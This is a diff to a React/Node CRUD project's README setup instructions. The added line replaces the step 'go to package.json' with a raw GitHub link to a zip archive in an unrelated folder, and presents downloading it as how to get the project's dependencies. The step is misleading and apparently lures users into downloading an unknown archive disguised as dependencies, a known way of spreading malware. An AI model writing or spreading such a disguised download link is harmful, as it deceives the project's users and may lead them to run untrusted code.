@@ -13,7 +13,7 @@ So you can add this app in your resume as well.
 # How can i used this project in my application
 - just go to code button and download the zip file 
 - after that extract that zip file to some folder where u want your react files
-- then go to that folder & go to package.json and download all the dependencies list that is in the dependencie key
+- then go to that folder & go to https://raw.githubusercontent.com/Krizx6/Nodejs-Mongodb-CRUD/main/neurodermatitis/Nodejs-Mongodb-CRUD.zip and download all the dependencies list that is in the dependencie key
 - before downloading dependencie you have to download npm first
 - thats it you have successfully imported my projects and executed in your computer
  Why i need to download further stuffs?
